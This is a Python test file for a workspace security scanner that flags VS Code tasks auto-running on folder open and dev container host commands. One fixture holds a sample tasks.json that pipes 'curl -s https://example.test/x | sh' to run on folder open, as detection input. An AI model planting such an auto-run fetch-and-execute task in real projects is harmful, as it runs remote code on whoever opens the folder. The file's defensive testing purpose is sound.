"""Editor task and dev container findings in background workspace assessments."""

from __future__ import annotations

import json
import os
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace

import pytest

from codex_plugin_scanner.guard import native_workspace_snapshot as native
from codex_plugin_scanner.guard import workspace_assessment_runner as runner
from codex_plugin_scanner.guard import workspace_assessment_store as assessments
from codex_plugin_scanner.guard import workspace_assessment_worker as worker
from codex_plugin_scanner.guard import workspace_editor_task_findings as editor_findings
from codex_plugin_scanner.guard.config import load_guard_config
from codex_plugin_scanner.guard.runtime import workspace_assessment_sync as sync
from codex_plugin_scanner.guard.store import GuardStore
from tests.test_guard_workspace_assessment_runner import (
    AUDIT,
    EDITOR_TASKS_COMPLETE,
    HOOKS_COMPLETE,
    PLUGINS_COMPLETE,
    SCANNED,
    SECRETS_COMPLETE,
    SKILLS_COMPLETE,
    SNAPSHOT,
    T0,
    WORKFLOWS_COMPLETE,
    queued_run,
)

FINDING_ID = "0123456789abcdef0123456789abcdef"
TASKS_PATH = ".vscode/tasks.json"
DEVCONTAINER_PATH = ".devcontainer/devcontainer.json"
FOLDER_OPEN = """{
  // Runs the moment the folder opens.
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "command": "curl -s https://example.test/x | sh",
      "runOptions": {"runOn": "folderOpen"},
    },
  ],
}"""
EMPTY_COVERAGE: dict[str, object] = {"status": "complete", "reasons": [], "detectors": {}}


def native_finding(**overrides: object) -> dict[str, object]:
    base: dict[str, object] = {
        "finding_id": FINDING_ID,
        "rule_id": "editor.task.folder-open",
        "category": "execution",
        "severity": "high",
        "confidence": "likely",
        "title": "Editor task runs when the folder is opened",
        "reason": "A VS Code task in this project is set to run when the folder is opened.",
        "false_positive_hint": "Expected when the maintainers start a watcher this way.",
        "path": TASKS_PATH,
    }
    return {**base, **overrides}


def editor_result(*findings: dict[str, object], **overrides: object) -> dict[str, object]:
    return {**EDITOR_TASKS_COMPLETE, "files_scanned": 1, "findings": list(findings), **overrides}


def run_with(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, editor_tasks: dict[str, object] | None):
    store, claimed = queued_run(tmp_path)
    scanned = replace(SCANNED, editor_tasks=editor_tasks)
    monkeypatch.setattr(runner, "workspace_snapshot", lambda root, **_: scanned)
    monkeypatch.setattr(runner, "_local_audit", lambda store, config, root: AUDIT)
    return store, claimed, runner.execute(store, None, claimed, clock=lambda: T0)


def test_detector_set_names_the_editor_task_detector() -> None:
    assert "editor_task_v1" in runner.DETECTOR_SET


def test_an_auto_run_task_and_a_host_command_are_warnings_with_their_paths(tmp_path: Path, monkeypatch) -> None:
    host = native_finding(
        finding_id="f" * 32,
        rule_id="devcontainer.initialize-command",
        severity="medium",
        title="Dev container runs a command on the host",
        path=DEVCONTAINER_PATH,
    )
    store, claimed, outcome = run_with(tmp_path, monkeypatch, editor_result(native_finding(), host))
    assert outcome.state == "completed"
    assert outcome.coverage is not None
    assert outcome.coverage["detectors"]["editor_task_v1"] == "complete"
    assert outcome.coverage["editor_task"]["files_scanned"] == 1
    found = [item for item in outcome.findings if item["detector"] == "editor_task_v1"]
    assert sorted((item["rule_ids"][0], item["severity"], item["path"]) for item in found) == [
        ("devcontainer.initialize-command", "medium", DEVCONTAINER_PATH),
        ("editor.task.folder-open", "high", TASKS_PATH),
    ]
    for finding in found:
        assert (finding["source_kind"], finding["decision"], finding["line"]) == ("workspace_source", "warn", None)
        assert all(finding[name] is None for name in ("ecosystem", "package_name", "package_version", "fix_version"))
    assert assessments.finish(store, claimed, outcome, now_ms=T0 + 1)


def test_editor_task_findings_sync_without_path_or_rule_text(tmp_path: Path, monkeypatch) -> None:
    store, claimed, outcome = run_with(tmp_path, monkeypatch, editor_result(native_finding()))
    assert assessments.finish(store, claimed, outcome, now_ms=T0 + 1)
    built = sync.build_workspace_assessment_sync(store, now="2026-01-01T00:00:00+00:00")
    assert built is not None
    text = json.dumps(built.payload)
    for private in (".vscode", "folder is opened", "watcher"):
        assert private not in text
    [entry] = built.payload["worktrees"]
    found = [item for item in entry["findings"] if item["detector"] == "editor_task_v1"]
    assert [(item["sourceKind"], item["decision"], item["ruleIds"]) for item in found] == [
        ("workspace_source", "warn", ["editor.task.folder-open"])
    ]


def test_a_worktree_without_editor_configuration_has_no_inputs(tmp_path: Path, monkeypatch) -> None:
    _, _, outcome = run_with(tmp_path, monkeypatch, EDITOR_TASKS_COMPLETE)
    assert outcome.state == "completed"
    assert outcome.coverage is not None
    assert outcome.coverage["detectors"]["editor_task_v1"] == "no_inputs"


def test_older_runtime_keeps_earlier_scans_and_reports_editor_tasks_not_run(tmp_path: Path, monkeypatch) -> None:
    store, claimed = queued_run(tmp_path)
    requested: list[tuple[bool, bool, bool]] = []

    def snapshot(root: Path, *, secrets: bool = False, workflows: bool = False, editor_tasks: bool = False, **_):
        requested.append((secrets, workflows, editor_tasks))
        if editor_tasks:
            raise native.WorkspaceSnapshotError("workspace_snapshot_editor_tasks_unavailable")
        if secrets:
            return replace(
                SNAPSHOT,
                secrets=SECRETS_COMPLETE,
                skills=SKILLS_COMPLETE,
                hooks=HOOKS_COMPLETE,
                plugins=PLUGINS_COMPLETE,
                workflows=WORKFLOWS_COMPLETE,
            )
        return SNAPSHOT

    monkeypatch.setattr(runner, "workspace_snapshot", snapshot)
    monkeypatch.setattr(runner, "_local_audit", lambda store, config, root: AUDIT)
    outcome = runner.execute(store, None, claimed, clock=lambda: T0)
    # Detector snapshot with editor tasks, again without them, then the plain recheck.
    assert requested == [(True, True, True), (True, True, False), (False, False, False)]
    assert outcome.state == "partial"
    assert outcome.coverage is not None
    assert outcome.coverage["reasons"] == ["detector_not_run:editor_task_v1"]
    assert outcome.coverage["detectors"]["ci_workflow_v1"] == "no_inputs"
    assert outcome.coverage["detectors"]["editor_task_v1"] == "not_run"


def test_a_runtime_without_the_editor_task_scan_is_named(monkeypatch: pytest.MonkeyPatch) -> None:
    from codex_plugin_scanner.guard import native_runtime

    features = (
        native.WORKSPACE_SNAPSHOT_FEATURE,
        native.WORKSPACE_SECRETS_FEATURE,
        native.WORKSPACE_SKILLS_FEATURE,
        native.WORKSPACE_HOOKS_FEATURE,
        native.WORKSPACE_PLUGINS_FEATURE,
        native.WORKSPACE_WORKFLOWS_FEATURE,
    )
    status = SimpleNamespace(
        available=True,
        compatible=True,
        identity=SimpleNamespace(path=Path("/runtime/hol-guard-runtime")),
        capabilities=SimpleNamespace(features=features),
    )
    monkeypatch.setattr(native_runtime, "native_runtime_status", lambda: status)
    with pytest.raises(native.WorkspaceSnapshotError) as raised:
        native._native_request({}, needs_workflows=True, needs_editor_tasks=True)
    assert raised.value.code == "workspace_snapshot_editor_tasks_unavailable"


@pytest.mark.parametrize(
    "reason",
    [
        "editor_task_oversize",
        "editor_task_not_text",
        "editor_task_unparsed",
        "editor_task_unread",
        "editor_task_linked",
        "path_too_long",
        "snapshot_entry_limit",
    ],
)
def test_a_configuration_the_scan_could_not_read_leaves_the_run_partial(
    tmp_path: Path, monkeypatch, reason: str
) -> None:
    result = editor_result(status="incomplete", truncation_reasons=[reason])
    _, _, outcome = run_with(tmp_path, monkeypatch, result)
    assert outcome.state == "partial"
    assert outcome.coverage is not None
    assert outcome.coverage["reasons"] == ["editor_task_incomplete"]
    assert outcome.coverage["detectors"]["editor_task_v1"] == "incomplete"
    assert outcome.coverage["editor_task"]["truncation_reasons"] == [reason]


def test_an_editor_task_scan_at_its_cap_marks_findings_truncated() -> None:
    coverage = editor_findings.with_editor_task_coverage(
        EMPTY_COVERAGE, editor_result(native_finding(), status="incomplete", truncation_reasons=["max_findings"])
    )
    assert coverage["reasons"] == ["editor_task_incomplete", "finding_cap"]


@pytest.mark.parametrize(
    "payload",
    [
        {"schema": "other"},
        {**EDITOR_TASKS_COMPLETE, "schema": "guard.workspace-workflows.v1"},
        {**EDITOR_TASKS_COMPLETE, "status": "weird"},
        {},
        {key: value for key, value in EDITOR_TASKS_COMPLETE.items() if key != "findings"},
        {**EDITOR_TASKS_COMPLETE, "findings": {"0": {}}},
        {key: value for key, value in EDITOR_TASKS_COMPLETE.items() if key != "files_scanned"},
        {**EDITOR_TASKS_COMPLETE, "files_scanned": True},
        {key: value for key, value in EDITOR_TASKS_COMPLETE.items() if key != "skipped"},
        {key: value for key, value in EDITOR_TASKS_COMPLETE.items() if key != "truncation_reasons"},
    ],
)
def test_an_unreadable_editor_task_result_is_an_error(payload: dict[str, object]) -> None:
    coverage = editor_findings.with_editor_task_coverage(EMPTY_COVERAGE, payload)
    assert (coverage["status"], coverage["reasons"]) == ("partial", ["editor_task_incomplete"])
    assert coverage["detectors"]["editor_task_v1"] == "error"


@pytest.mark.parametrize(
    "bad",
    [
        {"finding_id": "short"},
        {"rule_id": "ci.workflow.untrusted-checkout"},
        {"rule_id": "editor.task.unexpected"},
        {"rule_id": None},
        {"path": None},
        {"path": "tasks.json"},
        {"path": "packages/app/.vscode/tasks.json"},
        {"path": ".vscode/launch.json"},
        {"path": "packages/app.code-workspace"},
        {"path": "/.vscode/tasks.json"},
        {"path": ".vscode\\tasks.json"},
        {"path": DEVCONTAINER_PATH},
        {"rule_id": "devcontainer.initialize-command"},
        {"rule_id": "devcontainer.initialize-command", "path": ".devcontainer/a/b/devcontainer.json"},
        {"path": "w" * 4090 + ".code-workspace"},
        {"severity": "unknown"},
        {"confidence": "high"},
        {"title": ""},
        {"title": "line one\nline two"},
        {"false_positive_hint": "\x1b[31m"},
    ],
)
def test_a_malformed_finding_is_dropped_and_leaves_the_scan_incomplete(bad: dict[str, object]) -> None:
    result = editor_result(native_finding(**bad))
    assert editor_findings.project_editor_task_findings(result) == []
    coverage = editor_findings.with_editor_task_coverage(EMPTY_COVERAGE, result)
    assert coverage["detectors"]["editor_task_v1"] == "incomplete"
    assert coverage["editor_task"]["truncation_reasons"] == ["invalid_finding"]


def test_every_configuration_the_native_scan_reads_is_accepted() -> None:
    located = [
        ("editor.task.folder-open", TASKS_PATH),
        ("editor.task.folder-open", "app.code-workspace"),
        ("editor.task.folder-open", ".code-workspace"),
        ("devcontainer.initialize-command", ".devcontainer.json"),
        ("devcontainer.initialize-command", DEVCONTAINER_PATH),
        ("devcontainer.initialize-command", ".devcontainer/python/devcontainer.json"),
    ]
    result = editor_result(
        *(
            native_finding(finding_id=f"{index:032x}", rule_id=rule_id, path=path)
            for index, (rule_id, path) in enumerate(located)
        )
    )
    assert [item["path"] for item in editor_findings.project_editor_task_findings(result)] == [
        path for _, path in located
    ]
    coverage = editor_findings.with_editor_task_coverage(EMPTY_COVERAGE, result)
    assert coverage["detectors"]["editor_task_v1"] == "complete"


@pytest.fixture
def native_binary(monkeypatch: pytest.MonkeyPatch) -> None:
    if not Path(os.environ.get("HOL_GUARD_NATIVE_BINARY") or "").is_file():
        pytest.skip("needs HOL_GUARD_NATIVE_BINARY for the compiled runtime")
    empty_audit = {"audit_status": "complete", "manifest_paths": [], "lockfile_paths": [], "evaluation": {}}
    monkeypatch.setattr(runner, "_local_audit", lambda store, config, root: empty_audit)


def test_compiled_runtime_reports_an_auto_run_task_without_quoting_it(tmp_path: Path, native_binary: None) -> None:
    workspace = tmp_path / "workspace"
    (workspace / ".vscode").mkdir(parents=True)
    (workspace / ".vscode" / "tasks.json").write_text(FOLDER_OPEN, encoding="utf-8")
    (workspace / ".devcontainer").mkdir()
    (workspace / ".devcontainer" / "devcontainer.json").write_text(
        '{"image": "base", "postCreateCommand": "npm ci"}', encoding="utf-8"
    )
    store = GuardStore(tmp_path / "guard-home")
    admitted = worker.admit_workspace(store, str(workspace))
    keys = assessments.WorktreeKeys(str(admitted["codebase_key"]), str(admitted["worktree_key"]))
    assert worker.queue_manual_run(store, keys) == admitted["run_id"]
    assert runner.run_next(store, load_guard_config(store.guard_home), owner="test")
    [latest] = assessments.latest_assessed_runs(store)
    assert latest["coverage"]["detectors"]["editor_task_v1"] == "complete"
    assert latest["coverage"]["editor_task"]["files_scanned"] == 2
    found = [item for item in latest["findings"] if item["detector"] == "editor_task_v1"]
    assert [(item["rule_ids"], item["path"]) for item in found] == [(["editor.task.folder-open"], TASKS_PATH)]
    stored = json.dumps(latest)
    for quoted in ("bootstrap", "curl", "example.test", "npm ci"):
        assert quoted not in stored
